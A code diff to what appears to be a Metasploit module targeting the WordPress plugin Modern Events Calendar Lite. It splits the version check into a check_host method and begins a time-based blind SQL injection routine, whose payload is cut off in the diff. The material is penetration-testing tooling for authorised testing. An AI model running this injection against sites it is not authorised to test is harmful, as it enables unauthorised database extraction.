@@ -47,17 +47,21 @@ class MetasploitModule < Msf::Auxiliary
     ]
   end
 
-  def run_host(ip)
+  def check_host(_ip)
     unless wordpress_and_online?
-      fail_with Failure::NotVulnerable, 'Server not online or not detected as wordpress'
+      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')
     end
 
     checkcode = check_plugin_version_from_readme('modern-events-calendar-lite', '6.1.5')
-    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)
-      fail_with Failure::NotVulnerable, 'Modern Events Calendar version not vulnerable'
+    if checkcode == Msf::Exploit::CheckCode::Safe
+      return Msf::Exploit::CheckCode::Safe('Modern Events Calendar version not vulnerable')
     end
-    print_good('Vulnerable version of Modern Events Calendar detected')
 
+    print_good('Vulnerable version of Modern Events Calendar detected')
+    checkcode
+  end
+
+  def run_host(ip)
     @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload| # also tried encoder: :base64 and still not quite getting the right answer.
       d = Rex::Text.rand_text_numeric(4)
       # the webapp takes this parameter and uses it two times in the query, therefore our sleep is 2x what it should be. so we need to cut it.
